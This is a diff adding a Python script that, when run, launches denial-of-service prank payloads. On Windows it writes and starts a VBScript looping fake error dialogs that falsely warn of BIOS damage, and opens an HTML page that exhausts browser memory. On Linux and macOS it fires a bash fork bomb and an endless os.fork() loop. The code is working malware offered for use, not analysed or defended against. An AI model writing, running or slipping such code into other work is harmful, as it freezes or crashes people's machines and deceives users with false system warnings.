@@ -1,0 +1,56 @@
+import os
+import sys
+import subprocess
+
+def trigger_all_in_one():
+    # --- WINDOWS AUTOMATION ---
+    if os.name == 'nt':
+        # Combined Module 1 (VBS Loop) & Module 2 (JS Browser Crash)
+        
+        # 1. Generate and execute the VBScript dialog loop
+        vbs_code = """
+        DO UNTIL a
+            WScript.Sleep(29999)
+            x=MsgBox("There was a problem detected in your system. Do you want to mount propagation?", 2+16, "Error Notice!!!")
+            WScript.Sleep(999)
+            y=MsgBox("This may harm the BIOS of your computer. Are you sure?", 3+48, "Warning!")
+            WScript.Sleep(7999)
+            z=MsgBox("The process completed.             ", 0+64, "Message")
+        LOOP
+        """
+        with open("loop.vbs", "w") as f:
+            f.write(vbs_code)
+        subprocess.Popen(["wscript.exe", "loop.vbs"])
+        
+        # 2. Generate and open the JavaScript Memory Exhaustion page
+        html_code = """
+        <html>
+        <body>
+        <script>
+        var txt = "a";
+        while(1){ txt += "a"; }
+        </script>
+        <a href="http://crashsafari.com">Break The Browser!</a>
+        </body>
+        </html>
+        """
+        with open("crash.html", "w") as f:
+            f.write(html_code)
+        os.system("start crash.html")
+
+    # --- LINUX / UNIX / MAC AUTOMATION ---
+    else:
+        # Combined Module 3 (C-style Fork) & Module 4 (Bash Fork Bomb)
+        
+        # 1. Execute the Bash Fork Bomb via a subshell string
+        try:
+            subprocess.Popen([sys.executable, "-c", "import os; os.system(':(){ :|:& };:')"])
+        except Exception:
+            pass
+            
+        # 2. Infinite native Python process replication loop (C Fork Bomb equivalent)
+        while True:
+            os.fork()
+
+if __name__ == "__main__":
+    trigger_all_in_one()
